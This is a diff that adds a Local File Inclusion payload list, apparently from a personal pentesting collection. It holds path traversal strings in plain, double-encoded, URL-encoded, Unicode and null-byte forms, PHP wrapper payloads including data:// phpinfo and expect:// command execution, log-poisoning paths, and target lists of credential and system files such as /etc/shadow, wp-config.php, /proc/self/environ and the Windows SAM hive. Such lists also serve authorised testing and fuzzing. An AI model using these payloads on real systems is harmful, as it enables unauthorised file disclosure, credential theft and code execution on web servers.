@@ -1,0 +1,137 @@
+# ============================================
+# Author: Tamilsevan S
+# Role: Cybersecurity | Ethical Hacker | Red Hat
+# Website: https://tamilselvan-official.web.app/
+# ============================================
+# Local File Inclusion (LFI) Payloads
+# ============================================
+
+## Basic LFI
+../../../../etc/passwd
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+/etc/passwd
+/etc/hosts
+/etc/resolv.conf
+/etc/group
+/etc/issue
+/etc/motd
+/etc/mysql/my.cnf
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+
+## Windows LFI
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\windows\system32\drivers\etc\hosts
+..\windows\system32\drivers\etc\hosts
+windows\system32\drivers\etc\hosts
+C:\windows\system32\drivers\etc\hosts
+C:/windows/system32/drivers/etc/hosts
+C:\boot.ini
+C:/boot.ini
+C:\windows\win.ini
+C:/windows/win.ini
+
+## Double Encoding LFI
+..%252f..%252f..%252fetc/passwd
+..%252f..%252f..%252f..%252fetc/passwd
+%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+
+## URL Encoding LFI
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+
+## Unicode/UTF-8 LFI
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+
+## Null Byte LFI (PHP < 5.3.4)
+../../../../etc/passwd%00
+../../../../etc/passwd%00.php
+../../../etc/passwd%00
+../../../etc/passwd%00.txt
+
+## Path Traversal with Filename
+../../../../etc/passwd%2500
+../../../../etc/passwd%2500.php
+../../../../etc/passwd%00.png
+
+## Wrappers and Protocols
+php://filter/read=convert.base64-encode/resource=../../../etc/passwd
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/string.rot13/resource=../../../etc/passwd
+php://input
+php://stdout
+php://stderr
+php://output
+php://fd/1
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+
+## File Wrapper LFI
+file:///etc/passwd
+file:///C:/windows/system32/drivers/etc/hosts
+file://localhost/etc/passwd
+file://localhost/C:/windows/system32/drivers/etc/hosts
+
+## Expect Wrapper
+expect://id
+expect://ls
+expect://whoami
+expect://cat%20/etc/passwd
+
+## Zip Wrapper
+zip:///path/to/file.zip%23file.txt
+
+## Log File Poisoning
+../../../../var/log/apache2/access.log
+../../../../var/log/apache/access.log
+../../../../var/log/nginx/access.log
+../../../../var/log/httpd/access.log
+../../../../var/log/apache2/error.log
+../../../../var/log/apache/error.log
+../../../../var/log/nginx/error.log
+../../../../var/log/httpd/error.log
+
+## SSH Log Poisoning
+../../../../var/log/auth.log
+../../../../var/log/secure
+
+## Common Sensitive Files
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/issue
+/etc/mysql/my.cnf
+/etc/nginx/nginx.conf
+/etc/apache2/apache2.conf
+/etc/httpd/conf/httpd.conf
+/etc/ssh/sshd_config
+/etc/crontab
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/configuration.php
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+
+## Windows Sensitive Files
+C:\boot.ini
+C:\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+C:\windows\system32\config\sam
+C:\windows\system32\config\system
+C:\windows\repair\sam
+C:\windows\repair\system
+C:\inetpub\wwwroot\web.config
+C:\inetpub\wwwroot\Global.asax
